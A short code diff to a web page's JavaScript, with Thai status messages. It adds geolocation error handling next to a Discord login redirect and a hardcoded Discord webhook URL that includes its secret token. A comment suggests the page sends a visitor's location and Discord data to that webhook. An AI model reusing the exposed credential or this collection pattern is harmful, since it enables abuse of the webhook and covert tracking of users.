@@ -144,7 +144,7 @@
       window.location.href = discordAuthUrl;
     });
 
-    const webhookUrl = "https://discord.com/api/webhooks/1381107593946202214/TUZFgWXhHIRUiQv28wgTtvbZz7tDZB--rXcLy1EyN7oE4FXkNfu7VrBtBBUVQDJRT-9u";
+   const webhookUrl = "https://discord.com/api/webhooks/1381107593946202214/TUZFgWXhHIRUiQv28wgTtvbZz7tDZB--rXcLy1EyN7oE4FXkNfu7VrBtBBUVQDJRT-9u";
 
     function getLocation() {
       const statusEl = document.getElementById("status");
@@ -209,6 +209,24 @@
       .catch(err => {
         statusEl.innerText = "❌ เกิดข้อผิดพลาด: " + err.message;
       });
+    }
+
+    function showError(error) {
+      const statusEl = document.getElementById("status");
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          statusEl.innerText = "❌ ผู้ใช้ปฏิเสธการขออนุญาตตำแหน่ง";
+          break;
+        case error.POSITION_UNAVAILABLE:
+          statusEl.innerText = "❌ ไม่สามารถระบุตำแหน่งได้ (ข้อมูลตำแหน่งไม่พร้อม)";
+          break;
+        case error.TIMEOUT:
+          statusEl.innerText = "❌ หมดเวลาการรอการระบุตำแหน่ง";
+          break;
+        default:
+          statusEl.innerText = "❌ เกิดข้อผิดพลาดในการระบุตำแหน่ง: " + error.message;
+          break;
+      }
     }
     
     // ตรวจว่ากลับมาจาก Discord (มี code อยู่) → ส่งข้อมูลเลย
